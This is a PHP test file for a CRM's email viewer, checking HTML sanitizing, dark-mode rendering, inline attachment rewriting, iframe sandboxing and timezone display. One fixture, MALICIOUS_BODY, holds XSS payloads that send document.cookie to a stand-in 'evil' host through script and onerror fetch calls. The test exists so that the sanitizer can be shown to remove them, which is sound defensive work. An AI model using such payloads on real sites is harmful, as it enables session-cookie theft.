<?php

declare(strict_types=1);

use App\Filament\Resources\PeopleResource\Pages\ViewPeople;
use App\Filament\Resources\PeopleResource\RelationManagers\EmailsRelationManager;
use App\Models\People;
use App\Models\User;
use Filament\Facades\Filament;
use Livewire\Features\SupportTesting\Testable;
use Relaticle\EmailIntegration\Enums\EmailParticipantRole;
use Relaticle\EmailIntegration\Enums\EmailPrivacyTier;
use Relaticle\EmailIntegration\Models\ConnectedAccount;
use Relaticle\EmailIntegration\Models\Email;
use Relaticle\EmailIntegration\Models\EmailAttachment;
use Relaticle\EmailIntegration\Support\EmailHtmlSanitizer;

mutates(Email::class, EmailHtmlSanitizer::class);

beforeEach(function (): void {
    $this->owner = User::factory()->withWorkspace()->create();
    $this->workspace = $this->owner->currentWorkspace;

    $this->account = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->create([
        'workspace_id' => $this->workspace->id,
        'user_id' => $this->owner->id,
    ]));

    $this->person = People::create([
        'workspace_id' => $this->workspace->id,
        'name' => 'Jane Doe',
        'creator_id' => $this->owner->id,
    ]);

    $this->actingAs($this->owner);
    Filament::setTenant($this->workspace);
});

function makeEmailWithBody(string $html): Email
{
    /** @var Email $email */
    $email = Email::factory()->create([
        'workspace_id' => test()->workspace->id,
        'user_id' => test()->owner->id,
        'connected_account_id' => test()->account->getKey(),
        'privacy_tier' => EmailPrivacyTier::FULL,
    ]);

    $email->body()->create([
        'body_text' => 'plain text',
        'body_html' => $html,
    ]);

    test()->person->emails()->attach($email);

    return $email->fresh(['body', 'participants', 'labels', 'attachments']);
}

function makeEmailWithPlainText(string $text): Email
{
    /** @var Email $email */
    $email = Email::factory()->create([
        'workspace_id' => test()->workspace->id,
        'user_id' => test()->owner->id,
        'connected_account_id' => test()->account->getKey(),
        'privacy_tier' => EmailPrivacyTier::FULL,
    ]);

    $email->body()->create([
        'body_text' => $text,
        'body_html' => null,
    ]);

    test()->person->emails()->attach($email);

    return $email->fresh(['body', 'participants', 'labels', 'attachments']);
}

/**
 * Render the email reader through the relation-manager overlay, the same
 * `x-email-integration::email-view` used on company and people Emails tabs.
 */
function mountEmailView(Email $email): Testable
{
    return livewire(EmailsRelationManager::class, [
        'ownerRecord' => test()->person,
        'pageClass' => ViewPeople::class,
    ])->call('selectEmail', $email->getKey());
}

const MALICIOUS_BODY = '<p>hello <b>world</b></p>'
    .'<script>document.location="//evil/?c="+document.cookie</script>'
    .'<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
    .'<svg onload="alert(1)"></svg>'
    .'<a href="javascript:alert(2)">click</a>';

it('strips scripts, event handlers and javascript urls from the email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    mountEmailView($email)
        ->assertDontSeeHtml('onerror')
        ->assertDontSeeHtml('onload="alert')
        ->assertDontSeeHtml('javascript:')
        ->assertDontSeeHtml('document.cookie')
        ->assertSeeHtml('hello');
});

it('preserves inline styles and presentational attributes used by email layouts', function (): void {
    $email = makeEmailWithBody(
        '<table bgcolor="#eeeeee" width="600"><tr>'
        .'<td align="center" style="color:#ff0000;padding:10px">'
        .'<p class="lead" style="font-weight:bold">Styled</p>'
        .'</td></tr></table>'
    );

    mountEmailView($email)
        ->assertSeeHtml('bgcolor=&quot;#eeeeee&quot;')
        ->assertSeeHtml('style=&quot;color:#ff0000;padding:10px&quot;')
        ->assertSeeHtml('class=&quot;lead&quot;')
        ->assertSeeHtml('align=&quot;center&quot;');
});

it('renders email participants and ai label through the email view helpers', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $email->participants()->createMany([
        [
            'role' => EmailParticipantRole::FROM,
            'name' => 'Alice Sender',
            'email_address' => 'alice@example.test',
        ],
        [
            'role' => EmailParticipantRole::TO,
            'name' => 'Tara Recipient',
            'email_address' => 'tara@example.test',
        ],
        [
            'role' => EmailParticipantRole::CC,
            'name' => 'Cal Copy',
            'email_address' => 'cal@example.test',
        ],
    ]);

    $email->labels()->create([
        'source' => 'system',
        'label' => 'Sales',
    ]);

    mountEmailView($email->fresh(['body', 'participants', 'labels', 'attachments']))
        ->assertSeeHtml('Alice Sender')
        ->assertSeeHtml('alice@example.test')
        ->assertSeeHtml('Tara Recipient')
        ->assertSeeHtml('tara@example.test')
        ->assertSeeHtml('Cal Copy')
        ->assertSeeHtml('cal@example.test')
        ->assertSeeHtml(__('filament/pages/email-inbox.recipients.details'))
        ->assertSeeHtml('Sales');
});

it('shows only the address when a recipient has no distinct name', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $email->participants()->createMany([
        [
            'role' => EmailParticipantRole::FROM,
            'name' => 'White Shark',
            'email_address' => 'white@example.test',
        ],
        [
            'role' => EmailParticipantRole::TO,
            'name' => null,
            'email_address' => 'zzz-private-leak@example.test',
        ],
    ]);

    mountEmailView($email->fresh(['body', 'participants', 'labels', 'attachments']))
        ->assertSeeHtml('White Shark')
        ->assertSeeHtml('white@example.test')
        ->assertSeeHtml('zzz-private-leak@example.test');
});

it('does not truncate email bodies larger than the sanitizer default input cap', function (): void {
    // Symfony HtmlSanitizer truncates input at 20 KB by default; real email
    // bodies routinely exceed that, so the tail of the message must survive.
    $body = '<p>START-MARKER</p>'
        .str_repeat('<p>filler paragraph to exceed the twenty kilobyte input cap</p>', 600)
        .'<p>END-MARKER-9F3A</p>';

    expect(strlen($body))->toBeGreaterThan(20_000);

    $email = makeEmailWithBody($body);

    mountEmailView($email)
        ->assertSeeHtml('START-MARKER')
        ->assertSeeHtml('END-MARKER-9F3A');
});

it('wraps sanitized email html in a scriptless dark-mode preview document', function (): void {
    $html = EmailHtmlSanitizer::sanitize('<p style="color:#111111;background:#ffffff">Body</p>');

    expect($html)
        ->toContain('<meta name="color-scheme" content="light dark">')
        ->toContain(':root[data-theme="dark"]')
        ->toContain('background: transparent')
        ->toContain('padding: 16px')
        ->toContain('background-color: transparent !important')
        ->toContain('<p style="color:#111111;background:#ffffff">Body</p>')
        ->not->toContain('<script');
});

it('marks an email that paints its own background so the dark reader leaves it as designed', function (string $body): void {
    expect(EmailHtmlSanitizer::sanitize($body))->toContain('<html class="email-own-colors">');
})->with([
    'cell bgcolor' => '<table><tr><td bgcolor="#f4f1ea"><font color="#1a2b3c">Hi</font></td></tr></table>',
    'inline background colour' => '<div style="background-color:#f4f1ea">Hi</div>',
    'inline background shorthand' => '<div style="padding:8px; background: #0f3d2e url(https://example.test/band.png) no-repeat">Hi</div>',
    'inline background image' => '<div style="background-image: url(https://example.test/hero.png)">Hi</div>',
    'black background' => '<div style="background-color: rgb(0, 0, 0)">Hi</div>',
    'gmail highlight' => '<span style="background-color: rgb(255, 255, 0)">Hi</span>',
]);

it('leaves an email that paints no background to the dark reader', function (string $body): void {
    expect(EmailHtmlSanitizer::sanitize($body))
        ->toContain('<html>')
        ->not->toContain('<html class="email-own-colors">');
})->with([
    'plain reply' => '<div dir="ltr"><p>Thanks for the call.</p><blockquote>On Monday you wrote:</blockquote></div>',
    'apple mail text colour' => '<div style="caret-color: rgb(0, 0, 0); color: rgb(0, 0, 0);">Thanks</div>',
    'outlook windowtext' => '<span style="font-size:11.0pt;color:windowtext">Thanks</span>',
    'gmail signature' => '<div style="color:rgb(136,136,136)">Olivia Owner</div>',
    'font colour' => '<table><tr><td><font color="#000000">Hi</font></td></tr></table>',
    'transparent background' => '<div style="background:transparent">x</div>',
    'no background' => '<div style="background:none">x</div>',
    'shorthand with nothing painted' => '<div style="background: none repeat scroll 0% 0% transparent !important">x</div>',
    'zero alpha background' => '<div style="background-color: rgba(0, 0, 0, 0)">x</div>',
    'transparent bgcolor' => '<table><tr><td bgcolor="transparent">x</td></tr></table>',
    'zero alpha without leading zero' => '<div style="background-color: rgba(0,0,0,.0)">x</div>',
    'zero alpha slash syntax' => '<div style="background-color: rgb(255 255 255 / 0)">x</div>',
    'upper case important' => '<div style="background: transparent !IMPORTANT">x</div>',
    'outlook white page' => '<div style="background:white">Hi</div>',
    'white bgcolor' => '<table><tr><td bgcolor="#FFFFFF">Hi</td></tr></table>',
    'pasted white span' => '<p>Thanks</p><span style="background-color: rgb(255, 255, 255)">pasted</span>',
    'border colour only' => '<table style="border-color: #dddddd"><tr><td>Hi</td></tr></table>',
    'colour named in the text' => '<p>Pick a color: blue, or a background: red.</p>',
]);

it('rewrites cid image references to authorized inline attachment urls', function (): void {
    $email = makeEmailWithBody('<p><img src="cid:logo@example.test"></p>');
    $attachment = EmailAttachment::factory()->inline()->create([
        'email_id' => $email->getKey(),
        'content_id' => 'logo@example.test',
    ]);

    $html = EmailHtmlSanitizer::sanitize($email->body?->body_html, collect([$attachment]));

    expect($html)
        ->toContain(route('email-attachments.inline', ['attachment' => $attachment->getKey()]))
        ->not->toContain('cid:logo@example.test');
});

it('splits inline attachments and sanitizes body html from the email model', function (): void {
    $email = makeEmailWithBody('<p><img src="cid:logo@example.test"></p>');
    $inlineAttachment = EmailAttachment::factory()->inline()->create([
        'email_id' => $email->getKey(),
        'content_id' => 'logo@example.test',
    ]);
    EmailAttachment::factory()->create([
        'email_id' => $email->getKey(),
        'filename' => 'invoice.pdf',
    ]);

    $email->load('attachments');

    expect($email->inlineAttachments())->toHaveCount(1)
        ->and($email->downloadAttachments())->toHaveCount(1)
        ->and($email->sanitizedBodyHtml())
        ->toContain(route('email-attachments.inline', ['attachment' => $inlineAttachment->getKey()]))
        ->not->toContain('cid:logo@example.test');
});

it('renders a plain-text-only body in the email view without an iframe', function (): void {
    $email = makeEmailWithPlainText('Please review the invoice by Friday.');

    mountEmailView($email)
        ->assertSee('Please review the invoice by Friday.')
        ->assertDontSeeHtml('<iframe');
});

it('renders the email view iframe without scripts and with same-origin height measurement', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    mountEmailView($email)
        ->assertSeeHtml('<iframe')
        ->assertSeeHtml('sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"')
        ->assertSeeHtml('referrerpolicy="no-referrer"')
        ->assertSeeHtml('px-2 sm:px-4')
        ->assertSeeHtml('dark:bg-gray-900 dark:[color-scheme:dark]')
        ->assertSeeHtml('dark:bg-gray-900')
        ->assertDontSeeHtml('allow-scripts');
});

it('renders the sent time in the viewer timezone', function (): void {
    $this->owner->forceFill(['timezone' => 'Asia/Yerevan'])->save();
    Filament::setCurrentPanel(Filament::getPanel('app'));
    $email = makeEmailWithBody('<p>when</p>');
    $email->forceFill(['sent_at' => '2026-03-10 20:30:00'])->save();

    mountEmailView($email)
        ->assertSee('Mar 11, 2026 · 12:30 AM')
        ->assertDontSee('Mar 10, 2026 · 8:30 PM');
});
